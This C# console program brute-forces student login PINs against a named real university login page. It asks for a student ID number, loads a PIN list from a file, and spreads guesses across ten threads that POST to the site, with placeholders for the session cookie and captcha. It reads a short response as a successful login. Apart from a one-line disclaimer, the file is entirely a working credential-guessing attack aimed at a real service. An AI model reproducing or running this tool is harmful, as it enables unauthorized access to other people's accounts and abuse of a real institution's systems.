using RestSharp;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace bf_cbis_netframework
{
    class BFFinder
    {
        List<Thread> listThread= new List<Thread>();
        Stopwatch sw = new Stopwatch();
        string pin = "";
        public BFFinder(int size,List<string> listPin,string nim) {
            Console.WriteLine("Adding thread....\n");
            sw.Start();
            
            for(int i = 0; i < size; i++)
            {
                Console.WriteLine("Thread-"+i+" added");
                listThread.Add(new Thread(() => breaker(i,listPin,nim)));
                listThread.ElementAt(i).Start();
                Console.WriteLine("Thread-" + i + " Running");
            }
            listThread.Add(new Thread(() =>
            {
                while (true)
                {
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.ForegroundColor= ConsoleColor.White;
                    Console.WriteLine("Time elapsed: " + sw.ElapsedMilliseconds / 1000 + " seconds");
                    Thread.Sleep(5000);
                }
            }));
            listThread[size].Start();
        }
        private void breaker(int index,List<string> listPin,string nim)
        {
            int start = index * 1000;
            Console.WriteLine("Searching pin from "+start +" To "+(start+1000)+"\n");
            List<string> newList = listPin.GetRange(start, 1000);
                var client = new RestClient("http://fti.upnyk.ac.id/login.html");
                var request = new RestRequest();
                request.Method = Method.Post;
                request.AddHeader("Cookie", "PHPSESSID=get_your_sessID");
                request.AlwaysMultipartFormData = true;
                request.AddParameter("user_id", nim);
                request.AddParameter("fcaptcha", "ocr_here");
                request.AddParameter("submit1", "Login");
            foreach(string s in newList)
            {
                request.AddParameter("pwd0", s.ToString());
                var response = client.Execute(request);
                Console.WriteLine(response.ContentLength);
                if (!String.IsNullOrEmpty(pin))
                {
                    clearThread(index);
                }
                if (response.ContentLength < 435)
                {
                    pin = s;
                    clearThread(index);
                    break;
                }
                else
                {
                    Console.BackgroundColor = ConsoleColor.Red;
                    Console.WriteLine(s + "\t Failed");
                    Thread.Sleep(200);
                    Console.BackgroundColor = ConsoleColor.Black;

                }
            }

        }

        private void clearThread(int indexThread)
        {
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Stopping all thread\nPlease dont close the program\nPIN might be found");
            foreach(Thread t in listThread)
            {
                if (t == listThread[indexThread])
                {
                    continue;
                }
                t.Abort();
                t.Join();
                Console.WriteLine("A thread was stoped");
            }
            Console.BackgroundColor = ConsoleColor.Green;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.WriteLine(pin + "\t SUCCESS\n\n");
            Console.WriteLine("\n\n\nYOUR PIN = " + pin + "\n\n\n\n");
            Console.ForegroundColor = ConsoleColor.White;
            listThread[indexThread].Abort();
            listThread[indexThread].Join();
            sw.Stop();
        }
    }
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\r\n                \r\n                \r\n ,--,     ,--,  \r\n |'. \\   / .`|  \r\n ; \\ `\\ /' / ;  \r\n `. \\  /  / .'  \r\n  \\  \\/  / ./   \r\n   \\  \\.'  /    \r\n    \\  ;  ;     \r\n   / \\  \\  \\    \r\n  ;  /\\  \\  \\   \r\n./__;  \\  ;  \\  \r\n|   : / \\  \\  ; \r\n;   |/   \\  ' | \r\n`---'     `--`  \r\n                \r\n");
            Console.Write("\n\nEnter NIM : ");
            string nim = Console.ReadLine();

            Console.WriteLine("I dont want to be included for illegal purposes.\n\n Bruteforce is working...");
            Thread.Sleep(2000);
            bool stat = false;
            //Read file into list
            var listPin = new List<string>(File.ReadAllLines(@"E:\\listpin.txt"));

            //looping the bruteforce
            var onGoingTime = new Stopwatch();
            Thread timer = new Thread(() =>
            {
                onGoingTime.Start();
                while (stat != true)
                {
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.WriteLine("time elapsed : " + onGoingTime.ElapsedMilliseconds.ToString() + "ms");
                    Thread.Sleep(5000);
                }
            });
            //timer.Start();
            BFFinder obj = new BFFinder(10, listPin, nim);            
            Console.ReadLine();
        }
    }
}
